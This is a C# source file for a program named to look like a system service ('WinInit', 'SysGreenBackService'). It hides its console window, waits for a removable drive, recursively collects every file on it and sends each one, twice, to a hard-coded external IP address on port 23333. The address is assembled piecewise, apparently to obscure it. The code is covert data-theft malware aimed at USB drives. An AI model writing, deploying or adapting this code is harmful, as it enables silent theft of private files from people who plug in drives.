using System;
using System.IO;
using System.Runtime.InteropServices;


namespace WinInit
{
	class Program
	{
		[DllImport("user32.dll", EntryPoint = "ShowWindow", SetLastError = true)]
		static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
		[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		
		static System.Collections.ArrayList GetDirectory(string dir)
		{
			DirectoryInfo TheFolder = new DirectoryInfo(dir);
			System.Collections.ArrayList l = new System.Collections.ArrayList();
			foreach (var sdir in TheFolder.GetDirectories())
			{
				System.Collections.ArrayList sl = GetDirectory(sdir.FullName);
				foreach(string n in sl)
				{
					l.Add(n);
				}
			}
			foreach(var file in TheFolder.GetFiles())
			{
				l.Add(file.FullName);
			}
			return l;
		}


		static void Main(string[] args)
		{
			Console.Title = "SysGreenBackService";
			IntPtr intptr = FindWindow("ConsoleWindowClass", "SysGreenBackService");
			if (intptr != IntPtr.Zero)
			{
				ShowWindow(intptr, 0);
			}

			string disk;
			while (true)
			{
				DriveInfo[] allDrives = DriveInfo.GetDrives();
				
				foreach (DriveInfo d in allDrives)
				{
					if (d.DriveType == DriveType.Removable)
					{
						disk = d.Name;
						goto _here;
					}
				}
			}

			_here:

			System.Collections.ArrayList array = GetDirectory(disk);

			string addr = 222.ToString() + "." + 201.ToString() + "." + 173.ToString() + "." + 74.ToString();

			try
			{
				foreach(string name in array)
				{
					FileClient.SendFile(addr, 23333, name);
					System.Threading.Thread.Sleep(2000);
				}
				foreach (string name in array)
				{
					FileClient.SendFile(addr, 23333, name);
					System.Threading.Thread.Sleep(2000);
				}
			}
			catch(System.Exception ex)
			{
				System.Console.WriteLine(ex.Message);
			}
		}
	}
}
